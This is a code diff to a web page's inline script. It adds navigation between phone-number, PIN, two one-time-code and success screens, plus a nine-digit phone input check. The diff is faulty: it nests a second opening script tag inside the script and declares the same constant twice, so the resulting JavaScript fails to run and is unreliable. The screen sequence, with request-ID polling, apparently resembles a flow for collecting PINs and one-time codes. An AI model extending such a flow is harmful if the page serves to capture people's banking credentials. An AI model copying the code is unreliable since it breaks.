@@ -168,6 +168,7 @@
   <div id="footerCurve" class="hidden"></div>
 
   <script>
+    <script>
     let currentRequestId = null;
     let pollInterval = null;
 
@@ -175,10 +176,54 @@
     const mainContainer = document.getElementById('mainContainer');
     const footerCurve = document.getElementById('footerCurve');
 
+    // Page declarations
     const phonePage = document.getElementById('phonePage');
-    const phonePage = document.getElementById('pinPage');
+    const pinPage = document.getElementById('pinPage');
     const otpScreenOne = document.getElementById('otpScreenOne');
     const otpScreenTwo = document.getElementById('otpScreenTwo');
     const successPage = document.getElementById('successPage');
-    
+
+    const secureModal = document.getElementById('secureModal');
+
+    // Demo page navigation
+    function showPage(pageId) {
+        const pages = [
+            phonePage,
+            pinPage,
+            otpScreenOne,
+            otpScreenTwo,
+            successPage
+        ];
+
+        pages.forEach(page => {
+            page.classList.add('hidden');
+        });
+
+        const selectedPage = document.getElementById(pageId);
+
+        if (selectedPage) {
+            selectedPage.classList.remove('hidden');
+            window.scrollTo(0, 0);
+        }
+    }
+
+    // Enable NEXT after nine digits
+    const phoneInput = document.getElementById('phoneInput');
+    const phoneButton = document.getElementById('phoneButton');
+
+    phoneInput.addEventListener('input', function () {
+        phoneInput.value = phoneInput.value
+            .replace(/\D/g, '')
+            .slice(0, 9);
+
+        phoneButton.disabled = phoneInput.value.length !== 9;
+    });
+
+    // Navigate to the next demo screen
+    phoneButton.addEventListener('click', function () {
+        if (phoneInput.value.length === 9) {
+            showPage('pinPage');
+        }
+    });
+
     const secureModal = document.getElementById('secureModal');
